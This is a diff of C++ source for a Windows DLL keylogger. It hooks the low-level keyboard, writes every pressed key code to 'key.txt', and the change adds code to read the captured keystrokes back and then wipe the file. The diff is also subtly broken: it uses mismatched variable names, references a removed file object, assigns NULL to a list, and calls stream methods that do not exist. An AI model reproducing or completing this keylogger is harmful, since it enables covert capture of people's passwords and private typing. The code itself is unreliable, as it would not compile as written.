@@ -27,8 +27,11 @@ HINSTANCE hDllInstance = 0;
 
 HANDLE tmpHandle = NULL;
 HWND hWindow = 0;
-std::ofstream file;
-std::list<int>* keyscode = NULL;
+std::ofstream file_out;
+std::ifstream file_int;
+
+std::list<std::string> lines = NULL;
+bool toerase = false;
 
 int installThread();
 
@@ -37,12 +40,17 @@ LRESULT CALLBACK kbproc(
 )
 {
 	KBDLLHOOKSTRUCT keyInfo = *((KBDLLHOOKSTRUCT*)lparam);
-
+	if (toerase)
+	{
+		file.close();
+		remove("key.txt");
+		file.open("key.txt");
+	}
 	if (wparam == WM_KEYDOWN)
 	{
 
 		std::cout << keyInfo.vkCode;
-		file << keyInfo.vkCode;
+		file_out << keyInfo.vkCode;
 		//MessageBox(NULL, L"Hello", L"YEs", NULL);
 	}
 	
@@ -56,8 +64,10 @@ int APIENTRY DllMain(HINSTANCE hInstance, DWORD fdwReason, PVOID pvReserved) {
 	{
 	case DLL_PROCESS_ATTACH:
 		hDllInstance = hInstance;
-		file.open("key.txt");
+		file.open_out("key.txt");
+			file.open_in("key.txt");
 		CreateThread(0, 0, (LPTHREAD_START_ROUTINE)&installThread, 0, 0, 0);
+		toerase = false;
 		//add_log("Attached.");
 		break;
 	case DLL_PROCESS_DETACH:
@@ -87,9 +97,13 @@ int installThread()
 	return (0);
 }
 
-int install()
+int getElements(std::list<std::string>& list, int nb)
 {
-
+	std::string buffer;
+	file_in.seek(0);
+	while (getline(file, buffer))
+		list.push_back(buffer);
+	toerase = true;
 	return (0);
 }
 
